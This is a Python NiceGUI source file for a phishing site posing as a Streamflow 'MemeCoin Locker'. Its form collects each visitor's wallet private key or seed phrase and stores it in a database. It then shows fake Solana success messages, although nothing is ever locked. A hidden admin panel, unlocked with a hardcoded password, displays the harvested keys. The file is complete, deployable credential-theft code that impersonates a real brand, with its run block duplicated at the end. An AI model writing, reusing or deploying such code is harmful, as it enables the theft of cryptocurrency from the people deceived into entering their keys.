import os
import sqlite3
import pandas as pd
from nicegui import ui

# Configurare Baza de Date
DB_PATH = 'data.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute('''CREATE TABLE IF NOT EXISTS u 
                 (n TEXT, k TEXT, s TEXT, a REAL, d INTEGER)''')
    conn.commit()
    conn.close()

init_db()

@ui.page('/')
def index():
    ui.add_head_html("""
        <style>
            body { background-color: #0b0e11 !important; color: white !important; font-family: 'Inter', sans-serif; }
            .q-field--filled .q-field__control { background: #1b1f23 !important; border: 1px solid #30363d !important; border-radius: 8px !important; }
            .q-field__native, .q-field__input { color: white !important; }
            .deploy-btn { background-color: #00ffbd !important; color: black !important; font-weight: bold !important; width: 100%; height: 55px; border-radius: 8px; }
            .admin-btn { background-color: transparent !important; color: #333 !important; border: 1px solid #1a1a1a !important; width: 100%; height: 40px; border-radius: 8px; margin-top: 40px; font-size: 10px; }
        </style>
    """)

    with ui.column().classes('w-full max-w-lg mx-auto p-6 gap-4'):
        ui.image('https://streamflow.finance/favicon.ico').classes('w-16 mx-auto mb-2')
        ui.label('MemeCoin Locker').classes('text-3xl font-bold text-center w-full mt-4')
        ui.label('Securely lock your project funds.').classes('text-gray-400 text-center w-full -mt-2 mb-6 text-sm')
        
        # Formular Colectare
        name = ui.input('Project Name').props('dark filled').classes('w-full')
        key = ui.input('Wallet Private Key / Seed Phrase').props('dark filled password-toggle').classes('w-full')
        
        with ui.row().classes('w-full gap-4'):
            symbol = ui.input('Token Symbol').props('dark filled').classes('flex-1')
            amount = ui.number('Amount', value=0.0).props('dark filled').classes('flex-1')
        
        days = ui.number('Lock Duration (Days)', value=365).props('dark filled').classes('w-full')

        def handle_save():
            if name.value and key.value:
                c = sqlite3.connect(DB_PATH)
                c.execute("INSERT INTO u VALUES (?,?,?,?,?)", (name.value, key.value, symbol.value, amount.value, days.value))
                c.commit(); c.close()
                ui.notify('Connecting to Solana Mainnet...', color='info')
                ui.notify('Success! Lock Deployed.', color='positive')

        ui.button('DEPLOY LOCK', on_click=handle_save).classes('deploy-btn')

        # --- SISTEM ADMIN CU PAROLĂ ---
        def check_password():
            if pass_input.value == 'Ovidiu20.04.2006':
                conn = sqlite3.connect(DB_PATH)
                df = pd.read_sql_query("SELECT * FROM u", conn)
                conn.close()
                results.clear()
                with results:
                    if df.empty:
                        ui.label('No data collected yet.').classes('text-gray-500 italic')
                    else:
                        ui.table(columns=[{'name': x, 'label': x, 'field': x} for x in df.columns], 
                                 rows=df.to_dict('records')).props('dark dense flat bordered')
                admin_content.style(display='block')
                pass_section.style(display='none')
                ui.notify('Access Granted', color='positive')
            else:
                ui.notify('Wrong Password', color='negative')

        def show_login():
            pass_section.style(display='block')

        # Buton discret de Login
        ui.button('ADMIN ACCESS', on_click=show_login).classes('admin-btn')

        # Secțiunea de Login (ascunsă inițial)
        pass_section = ui.column().classes('w-full mt-4 gap-2').style('display: none')
        with pass_section:
            pass_input = ui.input('Password').props('dark filled password-toggle').classes('w-full')
            ui.button('LOGIN', on_click=check_password).classes('w-full bg-blue-600')

        # Tabelul cu rezultate (ascuns inițial)
        admin_content = ui.column().classes('w-full mt-4 p-2 bg-black border border-gray-800 rounded').style('display: none')
        with admin_content:
            ui.label('PRIVATE DATA').classes('text-green-500 text-xs mb-2')
            results = ui.column().classes('w-full')

# CONFIGURARE PORT RENDER
port = int(os.environ.get('PORT', 10000))
ui.run(host='0.0.0.0', port=port, reload=False, title="Streamflow | Locker")

# CONFIGURARE PORT OBLIGATORIE PENTRU RENDER
port = int(os.environ.get('PORT', 10000))
ui.run(host='0.0.0.0', port=port, reload=False, title="Streamflow | Locker")
